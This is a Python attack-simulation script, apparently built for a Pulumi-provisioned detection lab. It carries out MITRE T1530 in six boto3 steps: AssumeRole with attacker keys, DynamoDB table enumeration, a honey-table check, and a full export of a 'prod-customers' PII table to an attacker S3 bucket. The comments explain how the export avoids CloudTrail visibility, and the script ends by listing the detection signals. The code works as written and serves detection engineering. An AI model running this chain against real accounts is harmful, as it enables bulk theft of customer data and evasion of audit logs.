# FILE: attack.py
"""
ATOMIC-DYNAMODB-EXPORT-TO-S3 -- Automated Attack Script
T1530: Data from Cloud Storage

3-phase, 6-step attack chain:
  Phase 1 - Credential Acquisition : AssumeRole via attacker static IAM key -> victim_role_boto3_session
  Phase 2 - Discovery              : ListTables + DescribeTable on prod-customers and internal-api-keys
  Phase 3 - Collection             : ExportTableToPointInTime + DescribeExport polling to COMPLETED
"""
import sys
import time
import random

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError


# =============================================================================
# Timing helpers
# =============================================================================
def op_delay(min_s: float = 2.0, max_s: float = 6.0) -> None:
    time.sleep(random.uniform(min_s, max_s))


def phase_delay() -> None:
    time.sleep(random.uniform(5, 15))


# =============================================================================
# Print helpers (ASCII only -- no Unicode arrows or em-dashes)
# =============================================================================
def print_step(msg: str) -> None:
    print(f"\n[*] {msg}")


def print_ok(msg: str) -> None:
    print(f"[+] {msg}")


def print_err(msg: str) -> None:
    print(f"[-] {msg}")


def print_info(msg: str) -> None:
    print(f"    {msg}")


# =============================================================================
# Static resource names (determined at authoring time, match __main__.py literals)
# =============================================================================
PROD_CUSTOMERS_TABLE = "prod-customers"
HONEY_TABLE          = "internal-api-keys"
EXPORT_PREFIX        = "exports/prod-customers"
EXPORT_FORMAT        = "DYNAMODB_JSON"
ROLE_SESSION_NAME    = "atomic-t1530-session"

# Export polling budget (attack plan: 15s interval, 40 attempts = 600s total)
POLL_INTERVAL_S = 15
MAX_POLL_ATTEMPTS = 40
TERMINAL_EXPORT_STATES = {"COMPLETED", "FAILED"}


# =============================================================================
# Entry point (backend contract)
# =============================================================================
def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Execute the 6-step T1530 DynamoDB-to-S3 export chain.

    Credential chain:
      attacker_boto3_session  <- outputs['attacker_access_key_id'] + outputs['attacker_secret_access_key']
      victim_role_boto3_session <- STS AssumeRole(victim_role_arn) via attacker_boto3_session

    All dynamic resource values come from `outputs`. No env reads, no disk reads,
    no subprocess calls.
    """

    # -- Required dynamic outputs ---------------------------------------------
    attacker_key_id     = outputs.get("attacker_access_key_id")
    attacker_key_secret = outputs.get("attacker_secret_access_key")
    victim_role_arn     = outputs.get("victim_role_arn")
    sink_bucket_name    = outputs.get("sink_bucket_name")

    if not attacker_key_id:
        raise RuntimeError("Missing required Pulumi output: attacker_access_key_id")
    if not attacker_key_secret:
        raise RuntimeError("Missing required Pulumi output: attacker_secret_access_key")
    if not victim_role_arn:
        raise RuntimeError("Missing required Pulumi output: victim_role_arn")
    if not sink_bucket_name:
        raise RuntimeError("Missing required Pulumi output: sink_bucket_name")

    print("\n" + "=" * 60)
    print(" ATOMIC-DYNAMODB-EXPORT-TO-S3  |  T1530")
    print("=" * 60)
    print_info(f"Region        : {region}")
    print_info(f"Victim role   : {victim_role_arn}")
    print_info(f"Sink bucket   : {sink_bucket_name}")
    print_info(f"Target table  : {PROD_CUSTOMERS_TABLE}")
    print_info(f"Honey table   : {HONEY_TABLE}")

    events_generated = []

    # =========================================================================
    # PHASE 1: Credential Acquisition -- STS AssumeRole
    # =========================================================================
    print("\n" + "=" * 60)
    print(" PHASE 1: Credential Acquisition -- STS AssumeRole")
    print("=" * 60)

    # -------------------------------------------------------------------------
    # Step 1: Exchange attacker static key for victim-role STS session
    #
    # Real-world tradecraft: attacker holds a long-lived IAM access key for a
    # low-privilege user (e.g. leaked from CI, exfiltrated from source repo).
    # AssumeRole pivots to a data-engineer identity with DynamoDB export rights.
    # The AssumeRole call appears in CloudTrail under the attacker user's identity
    # before the session key appears as the caller in subsequent DynamoDB calls.
    # -------------------------------------------------------------------------
    print_step("Step 1: AssumeRole -> victim_role_boto3_session (T1530)")
    print_info("Attacker holds long-lived IAM access key for a low-privilege user.")
    print_info("AssumeRole pivots to data-engineer identity with DynamoDB export rights.")
    print_info(f"Attacker key  : {attacker_key_id}")
    print_info(f"Target role   : {victim_role_arn}")

    attacker_boto3_session = boto3.Session(
        aws_access_key_id=attacker_key_id,
        aws_secret_access_key=attacker_key_secret,
        region_name=region,
    )
    sts_client = attacker_boto3_session.client("sts")

    try:
        assume_resp = sts_client.assume_role(
            RoleArn=victim_role_arn,
            RoleSessionName=ROLE_SESSION_NAME,
            DurationSeconds=3600,
        )
    except ClientError as e:
        raise RuntimeError(f"AssumeRole failed: {e}") from e

    victim_creds = assume_resp["Credentials"]
    victim_role_boto3_session = boto3.Session(
        aws_access_key_id=victim_creds["AccessKeyId"],
        aws_secret_access_key=victim_creds["SecretAccessKey"],
        aws_session_token=victim_creds["SessionToken"],
        region_name=region,
    )
    print_ok(f"AssumeRole succeeded -- session key: {victim_creds['AccessKeyId']}")
    print_ok(f"victim_role_boto3_session built -- roleSessionName={ROLE_SESSION_NAME}")
    events_generated.append(
        f"AssumeRole (sts.amazonaws.com) -- roleSessionName={ROLE_SESSION_NAME}"
        f" into {victim_role_arn}"
    )
    op_delay(2, 4)

    phase_delay()

    # =========================================================================
    # PHASE 2: Discovery -- DynamoDB Table Enumeration
    # =========================================================================
    print("\n" + "=" * 60)
    print(" PHASE 2: Discovery -- DynamoDB Table Enumeration")
    print("=" * 60)

    dynamodb = victim_role_boto3_session.client("dynamodb", region_name=region)

    # -------------------------------------------------------------------------
    # Step 2: ListTables -- full regional enumeration with pagination
    #
    # Pagination key: LastEvaluatedTableName -> ExclusiveStartTableName.
    # This enumeration surfaces both the high-value prod-customers table and the
    # internal-api-keys honey table, which the attacker investigates as a
    # secondary target. CloudTrail records every ListTables page call.
    # -------------------------------------------------------------------------
    print_step("Step 2: ListTables -- enumerate all DynamoDB tables (T1530)")
    print_info("Paginating via LastEvaluatedTableName to discover all tables in region.")
    print_info("Surfaces prod-customers (target) and internal-api-keys (honey table).")

    discovered_tables = []
    exclusive_start = None
    page = 0
    while True:
        page += 1
        list_kwargs = {}
        if exclusive_start:
            list_kwargs["ExclusiveStartTableName"] = exclusive_start
        try:
            list_resp = dynamodb.list_tables(**list_kwargs)
        except ClientError as e:
            print_err(f"ListTables page {page} error: {e}")
            break

        page_tables = list_resp.get("TableNames", [])
        discovered_tables.extend(page_tables)
        print_ok(f"ListTables page {page}: {len(page_tables)} table(s)")
        for t in page_tables:
            print_info(f"  {t}")

        exclusive_start = list_resp.get("LastEvaluatedTableName")
        if not exclusive_start:
            break

    print_ok(f"Total tables discovered: {len(discovered_tables)}")
    if PROD_CUSTOMERS_TABLE not in discovered_tables:
        print_err(f"Warning: target table '{PROD_CUSTOMERS_TABLE}' not in listing -- proceeding")
    if HONEY_TABLE not in discovered_tables:
        print_err(f"Warning: honey table '{HONEY_TABLE}' not in listing -- proceeding")

    events_generated.append(
        "ListTables (dynamodb.amazonaws.com) -- full regional enumeration"
        f" from victim-role STS session {ROLE_SESSION_NAME}"
    )
    op_delay(2, 5)

    # -------------------------------------------------------------------------
    # Step 3: DescribeTable -- prod-customers (primary PII target)
    #
    # DescribeTable is the attacker's signal that this is a high-value PII table.
    # Captures TableArn required for ExportTableToPointInTime.
    # ItemCount may read 0 on a freshly seeded table (DynamoDB refreshes ~6h);
    # do not gate on this value.
    # -------------------------------------------------------------------------
    print_step(f"Step 3: DescribeTable -- '{PROD_CUSTOMERS_TABLE}' -- pre-export target ID (T1530)")
    print_info("TableArn captured here is required for ExportTableToPointInTime in Step 5.")
    print_info("ItemCount may read 0 on fresh seed (DynamoDB refreshes every ~6h); not gated.")

    prod_customers_arn = None
    try:
        desc_resp = dynamodb.describe_table(TableName=PROD_CUSTOMERS_TABLE)
        table_info = desc_resp["Table"]
        prod_customers_arn = table_info["TableArn"]
        item_count    = table_info.get("ItemCount", "unknown")
        table_status  = table_info.get("TableStatus", "unknown")
        schema_attrs  = [a["AttributeName"] for a in table_info.get("AttributeDefinitions", [])]
        print_ok(f"DescribeTable succeeded -- {PROD_CUSTOMERS_TABLE}")
        print_info(f"  ARN       : {prod_customers_arn}")
        print_info(f"  ItemCount : {item_count}")
        print_info(f"  Status    : {table_status}")
        print_info(f"  Schema    : {schema_attrs}")
    except ClientError as e:
        print_err(f"DescribeTable '{PROD_CUSTOMERS_TABLE}' error: {e}")

    events_generated.append(
        f"DescribeTable (dynamodb.amazonaws.com) -- {PROD_CUSTOMERS_TABLE}"
        " (pre-export target identification from victim-role session)"
    )
    op_delay(2, 4)

    # -------------------------------------------------------------------------
    # Step 4: DescribeTable -- internal-api-keys (honey table recon)
    #
    # Table name implies stored credentials -- a realistic secondary target.
    # PITR is intentionally disabled on this table; victim policy has no
    # ExportTableToPointInTime grant scoped to its ARN. Recon only; no export.
    # An export attempt would raise ContinuousBackupsUnavailableException.
    # -------------------------------------------------------------------------
    print_step(f"Step 4: DescribeTable -- '{HONEY_TABLE}' -- honey table recon (T1530)")
    print_info("Name implies stored credentials -- realistic attacker secondary-target interest.")
    print_info("PITR disabled intentionally; export attempt would raise ContinuousBackupsUnavailableException.")
    print_info("Recon only -- no export attempted on this table.")

    try:
        honey_resp = dynamodb.describe_table(TableName=HONEY_TABLE)
        honey_info = honey_resp["Table"]
        honey_arn    = honey_info.get("TableArn", "unknown")
        honey_status = honey_info.get("TableStatus", "unknown")
        honey_billing_summary = honey_info.get("BillingModeSummary", {})
        honey_billing = honey_billing_summary.get("BillingMode", "unknown")
        honey_schema  = [a["AttributeName"] for a in honey_info.get("AttributeDefinitions", [])]
        print_ok(f"DescribeTable succeeded -- {HONEY_TABLE}")
        print_info(f"  ARN     : {honey_arn}")
        print_info(f"  Status  : {honey_status}")
        print_info(f"  Billing : {honey_billing}")
        print_info(f"  Schema  : {honey_schema}")
        print_info("  PITR    : disabled -- export not attempted (ContinuousBackupsUnavailableException expected)")
    except ClientError as e:
        print_err(f"DescribeTable '{HONEY_TABLE}' error: {e}")

    events_generated.append(
        f"DescribeTable (dynamodb.amazonaws.com) -- {HONEY_TABLE}"
        " (attacker interest in credential-named honey table)"
    )
    op_delay(3, 7)

    phase_delay()

    # =========================================================================
    # PHASE 3: Collection -- DynamoDB Export to S3 (T1530)
    # =========================================================================
    print("\n" + "=" * 60)
    print(" PHASE 3: Collection -- DynamoDB Export to S3 (T1530)")
    print("=" * 60)

    # -------------------------------------------------------------------------
    # Step 5: ExportTableToPointInTime -- trigger full PII export to S3 sink
    #
    # The DynamoDB native export path bypasses GetItem/Scan visibility entirely --
    # no per-item API calls appear in CloudTrail. Only this control-plane trigger
    # is the caller's visible audit event. The DynamoDB service principal performs
    # the actual S3 PutObject writes; those appear in S3 server access logs with
    # the service principal as requester, not the victim-role session.
    #
    # ExportTime omitted: DynamoDB defaults to now, which is always within the
    # PITR window for a freshly enabled table. Passing a fixed timestamp risks
    # falling outside the backup window on a new table.
    # ExportType omitted: avoids botocore ParamValidationError on older SDK versions.
    # -------------------------------------------------------------------------
    print_step(
        f"Step 5: ExportTableToPointInTime -- '{PROD_CUSTOMERS_TABLE}'"
        f" -> s3://{sink_bucket_name}/{EXPORT_PREFIX} (T1530)"
    )
    print_info("Native DynamoDB export bypasses GetItem/Scan CloudTrail visibility.")
    print_info("Only the control-plane trigger appears in CloudTrail under victim-role session.")
    print_info("DynamoDB service principal performs S3 writes (not the victim-role session).")
    print_info("ExportTime omitted -- defaults to now (safe; avoids PITR window edge cases).")
    print_info("ExportType omitted -- avoids botocore ParamValidationError on older SDK versions.")

    if not prod_customers_arn:
        raise RuntimeError(
            f"prod_customers_arn is unresolved from Step 3 DescribeTable"
            f" -- cannot call ExportTableToPointInTime"
        )

    export_arn = None
    try:
        export_resp = dynamodb.export_table_to_point_in_time(
            TableArn=prod_customers_arn,
            S3Bucket=sink_bucket_name,
            S3Prefix=EXPORT_PREFIX,
            ExportFormat=EXPORT_FORMAT,
        )
        export_desc = export_resp["ExportDescription"]
        export_arn    = export_desc["ExportArn"]
        export_status = export_desc.get("ExportStatus", "unknown")
        print_ok("ExportTableToPointInTime call succeeded")
        print_ok(f"  ExportArn    : {export_arn}")
        print_ok(f"  ExportStatus : {export_status}")
        print_info(f"  Destination  : s3://{sink_bucket_name}/{EXPORT_PREFIX}/")
        print_info(f"  Format       : {EXPORT_FORMAT}")
    except ClientError as e:
        raise RuntimeError(f"ExportTableToPointInTime failed: {e}") from e

    events_generated.append(
        "ExportTableToPointInTime (dynamodb.amazonaws.com) -- prod-customers"
        f" -> s3://{sink_bucket_name}/{EXPORT_PREFIX} from victim-role STS session {ROLE_SESSION_NAME}"
    )
    op_delay(5, 10)

    # -------------------------------------------------------------------------
    # Step 6: DescribeExport polling -- wait for COMPLETED or FAILED
    #
    # Poll budget: 15-second interval, 40 attempts maximum (600 seconds total).
    # COMPLETED is the required terminal state.
    # IN_PROGRESS at budget exhaustion is a failure per the export-completion
    # readiness gate -- raise RuntimeError with final ExportStatus logged.
    # Repeated DescribeExport calls (up to 40) appear in CloudTrail as separate
    # events, each a forensic breadcrumb of attacker polling behavior.
    # -------------------------------------------------------------------------
    print_step("Step 6: DescribeExport polling -- wait for COMPLETED or FAILED (T1530)")
    print_info(f"Poll budget: {POLL_INTERVAL_S}s interval, {MAX_POLL_ATTEMPTS} attempts max ({POLL_INTERVAL_S * MAX_POLL_ATTEMPTS}s total).")
    print_info("COMPLETED is the required terminal state per the export-completion readiness gate.")
    print_info("IN_PROGRESS at budget exhaustion raises RuntimeError.")

    poll_desc = {}
    final_status = None
    last_attempt = 0

    for attempt in range(1, MAX_POLL_ATTEMPTS + 1):
        last_attempt = attempt
        time.sleep(POLL_INTERVAL_S)
        try:
            poll_resp = dynamodb.describe_export(ExportArn=export_arn)
            poll_desc = poll_resp["ExportDescription"]
            current_status = poll_desc.get("ExportStatus", "UNKNOWN")
            print_info(
                f"  DescribeExport attempt {attempt}/{MAX_POLL_ATTEMPTS}"
                f" -- ExportStatus={current_status}"
            )
            if current_status in TERMINAL_EXPORT_STATES:
                final_status = current_status
                break
        except ClientError as e:
            print_err(f"DescribeExport attempt {attempt} error: {e}")

    events_generated.append(
        f"DescribeExport (dynamodb.amazonaws.com) -- polled {last_attempt} time(s)"
        f" over ~{last_attempt * POLL_INTERVAL_S}s"
        f", final status={final_status or 'IN_PROGRESS (budget exhausted)'}"
    )

    if final_status is None:
        raise RuntimeError(
            f"Export did not reach a terminal state within"
            f" {MAX_POLL_ATTEMPTS * POLL_INTERVAL_S}s"
            f" (last ExportStatus=IN_PROGRESS). ExportArn: {export_arn}"
        )

    if final_status == "FAILED":
        failure_msg = poll_desc.get("FailureMessage", "no failure message returned")
        print_err(f"Export FAILED: {failure_msg}")
        print_err(f"ExportArn: {export_arn}")
        print_info("Cleanup: pulumi destroy handles sink bucket via force_destroy=True.")
        print_info("ExportArn cannot be deleted via API -- expires per DynamoDB retention (~30d).")
    else:
        manifest_file        = poll_desc.get("ExportManifest", "")
        item_count_exported  = poll_desc.get("ItemCount", "unknown")
        export_size_bytes    = poll_desc.get("ExportSizeBytes", "unknown")
        print_ok("Export COMPLETED -- PII data has landed in S3 sink")
        print_ok(f"  ExportArn          : {export_arn}")
        print_ok(f"  ExportManifest     : {manifest_file}")
        print_ok(f"  ItemCount exported : {item_count_exported}")
        print_ok(f"  ExportSizeBytes    : {export_size_bytes}")
        print_ok(f"  S3 destination     : s3://{sink_bucket_name}/{EXPORT_PREFIX}/")
        print_info("Cleanup: pulumi destroy empties sink bucket via force_destroy=True (all export objects).")
        print_info("ExportArn cannot be deleted via API -- expires per DynamoDB retention (~30d).")
        print_info(f"Document ExportArn in run log: {export_arn}")

    # =========================================================================
    # Summary
    # =========================================================================
    print("\n" + "=" * 60)
    print(" ATTACK SUMMARY")
    print("=" * 60)
    print_info("Technique      : T1530 -- Data from Cloud Storage")
    print_info("Tactic         : Collection")
    print_info(f"Target table   : {PROD_CUSTOMERS_TABLE}")
    print_info(f"Honey table    : {HONEY_TABLE}")
    print_info(f"Sink bucket    : {sink_bucket_name}")
    print_info(f"Victim role    : {victim_role_arn}")
    print_info(f"Session name   : {ROLE_SESSION_NAME}")
    print_info(f"Export ARN     : {export_arn or 'not created'}")
    print_info(f"Export result  : {final_status or 'N/A'}")
    print_info("")
    print_info(f"CloudTrail events generated ({len(events_generated)}):")
    for i, ev in enumerate(events_generated, 1):
        print_info(f"  {i}. {ev}")
    print_info("")
    print_info("Key detection signals:")
    print_info("  - AssumeRole from attacker IAM user into victim-role STS session atomic-t1530-session")
    print_info("  - ListTables enumeration from victim-role STS session (attacker recon)")
    print_info("  - DescribeTable on prod-customers (pre-export PII target identification)")
    print_info("  - DescribeTable on internal-api-keys (honey table -- attacker credential interest)")
    print_info("  - ExportTableToPointInTime -- bulk PII export bypasses GetItem/Scan CloudTrail")
    print_info(f"  - DescribeExport polling ({last_attempt} calls over ~{last_attempt * POLL_INTERVAL_S}s)")
    print_info("  - S3 PutObject by DynamoDB service principal (not victim-role) -- S3 access logs / GD")
    print("=" * 60 + "\n")
